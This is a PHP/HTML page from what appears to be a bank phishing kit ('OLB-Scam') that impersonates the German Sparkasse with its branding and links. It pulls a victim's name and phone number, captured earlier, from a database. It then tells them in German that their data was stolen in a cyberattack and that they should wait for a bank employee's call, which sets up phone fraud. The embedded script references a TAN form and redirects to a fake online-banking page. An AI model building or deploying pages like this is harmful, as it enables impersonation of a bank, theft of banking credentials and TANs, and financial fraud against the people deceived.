<?php

require_once 'db.php';
session_start();
$session_id= session_id();

$servername = "database";
$username = "db01";
$password = "pass01";
$dbname = "db01";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}

$sql = "SELECT gender,name,first_name,mobil_number FROM user_data WHERE session_id = '$session_id'";

$result = $conn->query($sql);

if ($result->num_rows > 0) {
  // output data of each row
  while($row = $result->fetch_assoc()) {
    $firstname = $row["first_name"];
    $gender = $row["gender"];
    

    if($row["gender"] == "Divers") {
      $gender = $row["first_name"];
    }
    else {
      $gender = $row["gender"];
    }



    $name = $row["name"];
    $number = $row["mobil_number"];
  }
} else {
  echo "ERROR";
}
$conn->close();

?>

<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="refresh" content="10;url=Ergebnis.php" />
<style>
    * {
      box-sizing: border-box;
    }
    
    body {
      font-family: Arial, Helvetica, sans-serif;
      min-height: 100vh; margin:0;
   }

    
    /* Style the header */
    header {
      background-color: #df002a ;
      padding: 20px;
      text-align: left;
      font-size: 35px;
      color: white;
      min-height:50px;
    }
    
    /* Create two columns/boxes that floats next to each other */
    nav {
      float: left;
      width: 30%;
      background: rgb(255, 255, 255);
      padding: 20px;
    }
    
    /* Style the list inside the menu */
    nav ul {
      list-style-type: none;
      padding: 0;
    }
    
    article {
      float: left;
      padding: 20px;
      width: 100%;
      background-color: #e3e3e3;
      min-height:50px;
    }
    
    /* Clear floats after the columns */
    section::after {
      content: "";
      display: table;
      clear: both;
    }
    
    /* Style the footer */
    footer {
      background-color: rgb(122, 122, 122);
      padding: 10px;
      text-align: left;
      color: white;
    }

    body{ display:flex; flex-direction:column; }
    article{ flex:1; }

    a:link {color: white;
            text-decoration: none;}
    a:visited {color: white;
            text-decoration: none;}
    a:hover {color: white;
            text-decoration: none;}
    a:active {color: white;
            text-decoration: none;}

    /* Responsive layout - makes the two columns/boxes stack on top of each other instead of next to each other, on small screens */
    @media (max-width: 600px) {
      nav, article {
        width: 100%;
        height: auto;
      }
    }
    </style>

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
</head>
    <body>
      <header>
        <a href="https://www.dsgv.de">        <img src="Ressourcen/Klein (sparkassenlogo).png" style="height:auto; width:20%;">
        </a>
      </header> 

      <article>
      <div class="row">
          <div class="col-sm-6">
            <div class="card">
              <div class="card-body">
                <h4 style="color: #df002a;"><b>Überprüfung abgeschlossen</b></h4>
                <div class="row">
                  <div class="col">
                    <img src="Ressourcen/Info_Birne.jpeg" style="width: 35%; height: auto;">
                  </div>
                </div>  
              </div>
            </div>
          </div>
          <div class="col-sm-6">
            <div class="card">
              <div class="card-body">
              <?php echo "<p> Sehr geehrte*r {$gender} {$name}, <br> <br>
              leider müssen wir Ihnen mitteilen, dass Ihre Daten beim Cyberangriff erbeutet wurden. Um Sie vor eventuellen Angriffen zu schützen, wird Sie ein*e Sparkassen-Mitarbeiter*in telefonsich   unter der von Ihnen angegegebe Telefonnummer {$number} kontaktieren. <br> <br>
            Wir bitten für diesen Fehler um Entschuldigung und werden uns schnellstmöglich bei Ihnen melden. Bitte unternehmen Sie nichts bis Sie unser*e Mitarbeiter*in kontaktiert.
          <br> <br>
        Ihr Sparkassenverbund <p>"?>
              </div>
            </div>
          </div>
        </div>
      </article>

    <footer>
      <div class="row">
        <div class="col"> <table>
          <tr>
            <thead><b>Der Verband</b></thead><br>
            <tr><a href="https://www.dsgv.de/verband/aufgaben.html">Aufgaben</a></tr><br>
            <tr><a href="https://www.dsgv.de/verband/mitgliedschaften.html">Mitgliedschaften</a></tr><br>
            <tr><a href="https://www.dsgv.de/verband/einrichtungen.html">Einrichtungen</a></tr><br>
            <tr><a href="https://www.dsgv.de/verband/schlichtungsstelle.html">Schlichtungsstelle</a></tr><br>
            <tr><a href="https://www.dsgv.de/verband/karriere.html">Karriere</a></tr><br>
            <tr><a href="https://www.dsgv.de/verband/kontakt.html">Kontakt</a></tr><br>
          </tr>
        </table>
      </div>
        <div class="col"> <table>
          <tr>
            <thead><b>Sparkassen-Finanzgruppe</b></thead><br>
            <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/organisation/verbandsstruktur.html">Verbundstruktur</a></tr><br>
            <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/sicherungssystem.html">Sicherungssystem</a></tr><br>
            <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/publikationen/Vermoegensbarometer_2021.html">Vermögensbarometer</a></tr><br>
            <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/sparkassen-international.html">International</a></tr><br>
            <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/rating.html">Rating</a></tr><br>
            <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/pfandbriefe.html">Pfandbriefe</a></tr><br>
            <tr><a href="https://www.dsgv.de/sparkassen-finanzgruppe/sparkassentag/Sparkassentag-2023-Hannover.html">Sparkassentag</a></tr><br>
          </tr>
        </table>
      </div>
        <div class="col"> <table>
          <tr>
            <thead><b>Verantwortung</b></thead><br>
            <tr><a href="https://www.dsgv.de/unsere-verantwortung/gesellschaftliches-engagement/sportfoerderung.html">Sportförderung</a></tr><br>
            <tr><a href="https://www.dsgv.de/unsere-verantwortung/gesellschaftliches-engagement/kunstfoerderung-kulturfoerderung.html">Kunst- und Kulturförderung</a></tr><br>
            <tr><a href="https://www.dsgv.de/unsere-verantwortung/gesellschaftliches-engagement/finanzielle-bildung.html">Finanzielle Bildung</a></tr><br>
            <tr><a href="https://www.dsgv.de/unsere-verantwortung/gesellschaftliches-engagement/wirtschaftsfoerderung-wissenschaftsfoederung.html">Wissenschaftsförderung</a></tr><br>
            <tr><a href="https://www.dsgv.de/unsere-verantwortung/gesellschaftliches-engagement/stiftungen.html">Stiftungen</a></tr><br>
            <tr><a href="https://www.dsgv.de/unsere-verantwortung/bericht-an-die-gesellschaft.html">Bericht an die Gesellschaft</a></tr><br>
          </tr>
        </table></div>
        <div class="col"><table>
          <thead><b>Newsroom</b></thead><br>
          <tr><a href="https://www.dsgv.de/newsroom/blog.html">Blog</a></tr><br>
          <tr><a href="https://www.dsgv.de/newsroom/presse.html">Presse</a></tr><br>
          <tr><a href="https://www.dsgv.de/newsroom/termine.html">Termine</a></tr><br>
          <tr><a href="https://www.dsgv.de/newsroom/abo-service.html">Abo-Service</a></tr><br>
          <tr><a href="https://www.dsgv.de/newsroom/ansprechpartner.html">Ansprechpartner</a></tr><br>
        </table></div>
      </div>
      <hr>
      <div class="row">
        <div class="col">
          <a href="https://www.dsgv.de/impressum.html">Impressum</a>
        </div>
        <div class="col">
          <a href="https://www.dsgv.de/datenschutz.html">Datenschutz</a>
        </div>
        <div class="col"></div>
        <div class="col"></div>
        <div class="col"></div>
        <div class="col"></div>
        <div class="col"></div>
        <div class="col"></div>
        <div class="col"></div>
        <div class="col"></div>
        <div class="col"></div>
        <div class="col"></div>
      </div>
    </div>        
    </footer>

    <script>
      var form = document.getElementById("tan-form");

      if (document.getElementById("chiptan").checked == true  || document.getElementById("pushtan").checked == true) {
        document.getElementById("btn").addEventListener("click", function() {
          form.submit(); 
          document.location = "/Users/kaipistol/Documents/Visual%20Code%20Studio/OLB-Scam/OnlineBanking.html";
      });}
    </script>
    </body>
</html>